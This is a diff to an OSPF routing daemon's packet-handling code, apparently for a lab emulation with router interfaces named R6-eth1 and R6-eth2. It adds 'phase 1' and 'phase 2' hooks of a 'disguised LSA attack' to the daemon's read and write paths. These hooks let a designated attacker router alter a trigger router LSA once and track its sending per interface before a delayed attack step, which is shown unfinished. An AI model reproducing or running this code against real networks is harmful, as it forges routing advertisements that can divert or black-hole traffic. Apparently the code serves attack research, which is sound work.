@@ -56,6 +56,9 @@
 #define TRIGGER_LSA_POST_NETWORK "10.0.66.0"
 
 static int trigger_lsa_modified = 0;
+static int disguised_lsa_attack_thread_lanuched = 0;
+static int interface_eth1_sent_flag = 0;
+static int interface_eth2_sent_flag = 0;
 /* mastinux - end */
 
 /* Packet Type String. */
@@ -639,6 +642,8 @@ ospf_write_frags (int fd, struct ospf_packet *op, struct ip *iph,
 
 // mastinux - start
 /*
+	useful structs
+
 struct in_addr {
 	unsigned long s_addr;  // load with inet_aton()
 };
@@ -683,6 +688,75 @@ struct lsa_header {
 	u_int16_t length;
 };
 
+struct ospf_interface{  
+  struct ospf *ospf;				// This interface's parent ospf instance.
+  struct ospf_area *area;			// OSPF Area.
+  uint16_t lsa_pos_beg;				// Position range in Router LSA inclusive, >=
+  uint16_t lsa_pos_end;				// Position range in Router LSA exclusive, <
+  struct interface *ifp;			// Interface data from zebra.
+  struct ospf_vl_data *vl_data;		// Data for Virtual Link
+  struct ospf_fifo *obuf;			// Packet send buffer. Output queue
+  u_char type;						// OSPF Network Type.
+  u_char state;						// State of Interface State Machine.
+  u_char multicast_memberships;		// To which multicast groups do we currently belong?
+  struct prefix *address;			// Interface prefix
+  struct connected *connected;		// Pointer to connected
+  struct ospf_if_params *params;	// Configured varables.
+  u_int32_t crypt_seqnum;			// Cryptographic Sequence Number
+  u_int32_t output_cost;			// Acutual Interface Output Cost
+  struct route_table *nbrs;			// Neighbor information. OSPF Neighbor List
+  struct ospf_neighbor *nbr_self;	// Neighbor Self
+  struct list *nbr_nbma;			// List of configured NBMA neighbor.
+  struct ospf_lsa *network_lsa_self;// self-originated LSAs. network-LSA.
+  struct list *opaque_lsa_self;		// Type-9 Opaque-LSAs
+  struct route_table *ls_upd_queue;
+  struct list *ls_ack;				// Link State Acknowledgment list.
+  struct{
+    struct list *ls_ack;
+    struct in_addr dst;
+  } ls_ack_direct;
+  u_int32_t v_ls_ack;				// Timer values.// Delayed Link State Acknowledgment
+  struct thread *t_hello;			// timer
+  struct thread *t_wait;			// timer
+  struct thread *t_ls_ack;			// timer
+  struct thread *t_ls_ack_direct;	// event
+  struct thread *t_ls_upd_event;	// event
+  struct thread *t_opaque_lsa_self;	// Type-9 Opaque-LSAs
+  int on_write_q;
+  u_int32_t hello_in;				// Statistics fields. // Hello message input count.
+  u_int32_t hello_out;				// Hello message output count.
+  u_int32_t db_desc_in;				// database desc. message input count.
+  u_int32_t db_desc_ou;				// database desc. message output count.
+  u_int32_t ls_req_in;				// LS request message input count.
+  u_int32_t ls_req_out;				// LS request message output count.
+  u_int32_t ls_upd_in;				// LS update message input count.
+  u_int32_t ls_upd_out;				// LS update message output count.
+  u_int32_t ls_ack_in;				// LS Ack message input count.
+  u_int32_t ls_ack_out;				// LS Ack message output count.
+  u_int32_t discarded;				// discarded input count by error.
+  u_int32_t state_change;			// Number of status change.
+  u_int32_t full_nbrs;
+};
+
+struct interface{
+  char name[INTERFACE_NAMSIZ + 1];
+  ifindex_t ifindex;
+  uint64_t flags;						// Interface flags.
+  int metric;							// Interface metric
+  unsigned int mtu; 					// Interface MTU. // IPv4 MTU
+  unsigned int mtu6;					// IPv6 MTU - probably, but not neccessarily same as mtu
+  enum zebra_link_type ll_type;			// Link-layer information and hardware address
+  u_char hw_addr[INTERFACE_HWADDR_MAX];
+  int hw_addr_len;
+  unsigned int bandwidth;				// interface bandwidth, kbits
+  struct if_link_params *link_params;	// Link parameters for Traffic Engineering
+  char *desc;							// description of the interface.
+  void *distribute_in;					// Distribute list.
+  void *distribute_out;					// Distribute list.
+  struct list *connected;				// Connected address list.
+  void *info;							// Daemon specific interface data pointer.
+  vrf_id_t vrf_id;
+}
 */
 int current_router_is_attacker_router(struct ospf_interface *oi){
 	//zlog_debug ("############################################################### %s", inet_ntoa(oi->ospf->router_id));
@@ -693,7 +767,43 @@ int current_router_is_attacker_router(struct ospf_interface *oi){
 		return 0;
 }
 
-int disguised_lsa_attack_check_and_alter_link(struct stream *s, u_int16_t length){
+int disguised_lsa_attack_trigger_already_sent_on_interface(struct ospf_interface *oi){
+	char router_interfaces[2][8] = {"R6-eth1", "R6-eth2"};
+	int is_already_sent = 0;
+
+	zlog_debug ("############################################## interface %s", oi->ifp->name);
+	//zlog_debug ("############################################## interfaces %s %s", router_interfaces[0], router_interfaces[1] );
+
+	if ( strcmp(oi->ifp->name, router_interfaces[0]) == 0 ){
+		zlog_debug ("############################################## first interface");
+		zlog_debug ("############################################## pre-status %d", interface_eth1_sent_flag);
+
+		if ( interface_eth1_sent_flag )
+			is_already_sent = 1;
+		else
+			interface_eth1_sent_flag = 1;
+		
+		zlog_debug ("############################################## post-status %d", interface_eth1_sent_flag);
+	}
+
+	if ( strcmp(oi->ifp->name, router_interfaces[1]) == 0 ){
+		zlog_debug ("############################################## second interface");
+		zlog_debug ("############################################## pre-status %d", interface_eth2_sent_flag);
+
+		if ( interface_eth2_sent_flag )
+			is_already_sent = 1;
+		else
+			interface_eth2_sent_flag = 1;
+
+		zlog_debug ("############################################## post-status %d", interface_eth2_sent_flag);
+	}
+
+	zlog_debug ("############################################## is already sent %d", is_already_sent);
+
+	return is_already_sent;
+}
+
+int disguised_lsa_attack_check_and_alter_ls_update_link(struct stream *s, u_int16_t length){
 	// derived from ospf_router_lsa_dump (struct stream *s, u_int16_t length)
 	//char buf[BUFSIZ];
 	struct router_lsa *router_lsa;
@@ -784,7 +894,7 @@ int disguised_lsa_attack_check_and_alter_ls_update(struct stream *s, u_int16_t l
 			{
 				case OSPF_ROUTER_LSA:
 					//ospf_router_lsa_dump (s, length);
-					if ( disguised_lsa_attack_check_and_alter_link(s, length) ){
+					if ( disguised_lsa_attack_check_and_alter_ls_update_link(s, length) ){
 						// TODO analyze if Age must be changed
 						//	u_int32_t ls_age;
 						//zlog_debug("############################################## pre-age %d", ntohs (lsa->ls_age));
@@ -825,7 +935,7 @@ int disguised_lsa_attack_check_and_alter_ls_update(struct stream *s, u_int16_t l
 	return altered;
 }
 
-int disguised_lsa_attack_create_check_and_alter_lsa(struct stream *s){
+int disguised_lsa_attack_check_and_alter_ospf_packet(struct stream *s){
 	// derived from ospf_packet_dump (struct stream *s)
 	struct ospf_header *ospfh;
 	unsigned long gp;
@@ -898,7 +1008,7 @@ int disguised_lsa_attack_is_trigger_router_lsa (struct stream *s, u_int16_t leng
 	return is_trigger;
 }
 
-int disguised_lsa_attack_is_trigger_ls_upd (struct stream *s, u_int16_t length)
+int disguised_lsa_attack_is_trigger_ls_update (struct stream *s, u_int16_t length)
 {
 	// derived from ospf_packet_ls_upd_dump (s, ntohs (ospfh->length))
 
@@ -931,15 +1041,15 @@ int disguised_lsa_attack_is_trigger_ls_upd (struct stream *s, u_int16_t length)
 		lsa_len = ntohs (lsa->length);
 
 		//ospf_lsa_header_dump (lsa);
-		zlog_debug ("  LSA Header");
-		zlog_debug ("    LS age %d", ntohs (lsa->ls_age));
-		zlog_debug ("    Options %d", lsa->options);
-		zlog_debug ("    LS type %d", lsa->type);
-		zlog_debug ("    Link State ID %s", inet_ntoa (lsa->id));
-		zlog_debug ("    Advertising Router %s", inet_ntoa (lsa->adv_router));
-		zlog_debug ("    LS sequence number 0x%lx", (u_long)ntohl (lsa->ls_seqnum));
-		zlog_debug ("    LS checksum 0x%x", ntohs (lsa->checksum));
-		zlog_debug ("    length %d", ntohs (lsa->length));
+		zlog_debug (">>>  LSA Header");
+		zlog_debug (">>>    LS age %d", ntohs (lsa->ls_age));
+		zlog_debug (">>>    Options %d", lsa->options);
+		zlog_debug (">>>    LS type %d", lsa->type);
+		zlog_debug (">>>    Link State ID %s", inet_ntoa (lsa->id));
+		zlog_debug (">>>    Advertising Router %s", inet_ntoa (lsa->adv_router));
+		zlog_debug (">>>    LS sequence number 0x%lx", (u_long)ntohl (lsa->ls_seqnum));
+		zlog_debug (">>>    LS checksum 0x%x", ntohs (lsa->checksum));
+		zlog_debug (">>>    length %d", ntohs (lsa->length));
 
 		switch (lsa->type)
 		{
@@ -981,12 +1091,21 @@ int disguised_lsa_attack_is_trigger_ospf_packet(struct stream *s){
 
 	/* Show OSPF header detail. */
 	//ospf_header_dump (ospfh);
+	zlog_debug ("> Header");
+	zlog_debug (">  Version %d", ospfh->version);
+	zlog_debug (">  Type %d", ospfh->type);
+	zlog_debug (">  Packet Len %d", ntohs (ospfh->length));
+	zlog_debug (">  Router ID %s", inet_ntoa (ospfh->router_id));
+	zlog_debug (">  Area ID %s", inet_ntoa (ospfh->area_id));
+	zlog_debug (">  Checksum 0x%x", ntohs (ospfh->checksum));
+	//zlog_debug (">  AuType %s", LOOKUP (ospf_auth_type_str, auth_type));
+
 	stream_forward_getp (s, OSPF_HEADER_SIZE);
 
 	switch (ospfh->type)
 	{
 		case OSPF_MSG_LS_UPD:
-			if ( disguised_lsa_attack_is_trigger_ls_upd(s, ntohs (ospfh->length)) )
+			if ( disguised_lsa_attack_is_trigger_ls_update(s, ntohs (ospfh->length)) )
 				is_trigger = 1;
 			break;
 		default:
@@ -1044,15 +1163,30 @@ ospf_write (struct thread *thread)
   assert (op);
   assert (op->length >= OSPF_HEADER_SIZE);
 
-	// mastinux - start
+	// mastinux - phase 2 of 3 - start
 	if ( current_router_is_attacker_router(oi) )
 	{
 		if ( disguised_lsa_attack_is_trigger_ospf_packet(op->s) )
 		{
-			zlog_debug ("############################################## sending trigger lsa");
+			if ( !disguised_lsa_attack_trigger_already_sent_on_interface(oi) )
+			{
+				if (interface_eth1_sent_flag == 1 && interface_eth2_sent_flag == 1){
+					zlog_debug ("############################################## launching sleeping thread ...");
+
+					disguised_lsa_attack_thread_lanuched = 1;
+				}
+/*
+				if ( disguised_lsa_attack_thread_lanuched == 1 )
+				{
+					zlog_debug ("############################################## ignoring already sent trigger lsa");
+					// FIXME controlla se col return tutto funziona correttamente
+					return 0;
+				}
+*/
+			}
 		}
 	}
-	// mastinux - start
+	// mastinux - phase 2 of 3 - end
 
   if (op->dst.s_addr == htonl (OSPF_ALLSPFROUTERS)
       || op->dst.s_addr == htonl (OSPF_ALLDROUTERS))
@@ -3277,19 +3411,18 @@ ospf_read (struct thread *thread)
 	zlog_debug ("-----------------------------------------------------");
   }
 
-	// mastinux - start
+	// mastinux - phase 1 of 3 - start
 	if ( current_router_is_attacker_router(oi) )
 	{
 		// XXX modify trigger lsa only once
-		//zlog_debug ("############################################################### %d", trigger_lsa_modified);
 		if ( trigger_lsa_modified == 0 )
 		{
-			if ( disguised_lsa_attack_create_check_and_alter_lsa(ibuf) )
+			if ( disguised_lsa_attack_check_and_alter_ospf_packet(ibuf) )
 				trigger_lsa_modified = 1;
 		}
 	}
 	//zlog_debug ("############################################################### %d", trigger_lsa_modified);
-	// mastinux - end
+	// mastinux - phase 1 of 3 - end
 
   stream_forward_getp (ibuf, OSPF_HEADER_SIZE);
 
